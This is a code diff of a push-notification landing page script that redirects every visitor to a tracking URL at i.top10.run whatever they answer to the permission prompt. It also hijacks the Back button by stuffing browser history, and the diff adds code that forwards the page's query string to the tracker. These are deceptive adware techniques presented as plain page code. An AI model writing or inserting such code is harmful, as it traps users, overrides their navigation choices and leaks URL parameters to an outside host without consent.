@@ -61,13 +61,13 @@
     s.onload = function(result) {
         switch (result) {
             case 'onPermissionDefault':
-            window.location.replace("https://i.top10.run/click.php?key=s087agus7bg89lqa5oz6&to_path=2");break;
+            window.location.replace("https://i.top10.run/click.php?key=s087agus7bg89lqa5oz6&to_path=2&"+window.location.href.split("?",2)[1]);break;
             case 'onPermissionAllowed':
-            window.location.replace("https://i.top10.run/click.php?key=s087agus7bg89lqa5oz6&to_path=2");break;
+            window.location.replace("https://i.top10.run/click.php?key=s087agus7bg89lqa5oz6&to_path=2&"+window.location.href.split("?",2)[1]);break;
             case 'onPermissionDenied':
-            window.location.replace("https://i.top10.run/click.php?key=s087agus7bg89lqa5oz6&to_path=2");break;
+            window.location.replace("https://i.top10.run/click.php?key=s087agus7bg89lqa5oz6&to_path=2&"+window.location.href.split("?",2)[1]);break;
             case 'onAlreadySubscribed':
-            window.location.replace("https://i.top10.run/click.php?key=s087agus7bg89lqa5oz6&to_path=2");break;
+            window.location.replace("https://i.top10.run/click.php?key=s087agus7bg89lqa5oz6&to_path=2&"+window.location.href.split("?",2)[1]);break;
             case 'onNotificationUnsupported':break;
         }
     }
@@ -81,7 +81,7 @@
             for(t = 0; 10 > t; ++t) history.pushState({}, "", "");
                 onpopstate = function(t) {
                 PreventExitPop = false
-                t.state && location.replace("https://i.top10.run/click.php?key=s087agus7bg89lqa5oz6&to_path=2")
+                t.state && location.replace("https://i.top10.run/click.php?key=s087agus7bg89lqa5oz6&to_path=2&"+window.location.href.split("?",2)[1])
                 }
         } catch(o) {}
     }(); 
